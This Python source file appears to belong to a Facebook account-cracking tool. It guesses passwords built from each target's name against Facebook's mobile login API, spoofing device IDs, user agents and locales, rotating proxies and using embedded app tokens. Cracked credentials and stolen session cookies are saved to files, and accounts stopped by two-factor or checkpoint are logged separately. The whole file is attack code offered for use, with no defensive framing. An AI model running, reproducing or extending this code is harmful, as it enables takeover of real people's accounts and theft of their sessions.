import random, time, uuid, string, base64, os, sys
from config import *
from ua_generator import UA
from password_manager import generate_password

def __M3X__(self, ids, names, passlist):
    try:
        color = random.choice([
            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
        ])
        sys.stdout.write(
            f'\r{xp}{W}-{R}<[{W}NOX{R}-{W}{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M3{R}]>{W}-{R}<[{G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]> '
        )
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = generate_password(pw, fn, ln, names)
            ua = UA()
            accessToken = random.choice([
                '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
            ])
            random_seed = random.Random()
            pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
            adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            __locale__ = {
                "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE",
                "pt_BR": "BR"
            }
            country_locale = random.choice(list(__locale__.keys()))
            country_code = __locale__[country_locale]
            data = {
                "adid": adid,
                "format": "json",
                "device_id": device_id,
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": f"#{pax}:0:{int(time.time())}:{pas}",
                "access_token": f"{accessToken}",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": country_locale,
                "client_country_code": country_code,
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"
            }
            headers = {
                "User-Agent": ua,
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com",
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                "X-Tigon-Is-Retry": "False",
                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                "x-fb-device-group": "5120",
                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                "X-FB-Request-Analytics-Tags": "graphservice",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True",
                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
            }
            url = "https://api.facebook.com/auth/login"
            twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
            
            proxies = None
            if hasattr(self, 'proxy_manager') and self.proxy_manager:
                proxies = self.proxy_manager.get_random_proxy()
            
            if proxies:
                po = requests.post(url, data=data, headers=headers, proxies=proxies).json()
            else:
                po = requests.post(url, data=data, headers=headers).json()
            
            if 'session_key' in po:
                ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                print(f'\r{xp}{W}-{R}<{W}[{G}NOX-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')

                if 'y' in self.__COOKIE__:
                    colorX = random.choice([
                        "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                        "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                        "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                    ])
                    print(f'\r{xp}{W}-{G}<[{R}COOKIE{G}]>{colorX} ' + cookie + '\n')
                open('/sdcard/PS-/FILE/NOX-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                self.oks.append(ids)
                break
            if twf in str(po):
                if 'y' in self.__CP__:
                    print(f'\r{xp}{W}-{G}<[{Y}NOX-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')

                open('/sdcard/PS-/FILE/NOX-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
                self.twf.append(ids)
                break
            if 'www.facebook.com' in po['error']['message']:
                if 'y' in self.__CP__:
                    print(f'\r{xp}{W}-{R}<[{W}NOX-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
                    
                open('/sdcard/PS-/FILE/NOX-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
                self.cps.append(ids)
                break
            else:
                continue
        self.loop += 1
    except requests.exceptions.Timeout:
        time.sleep(20)
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass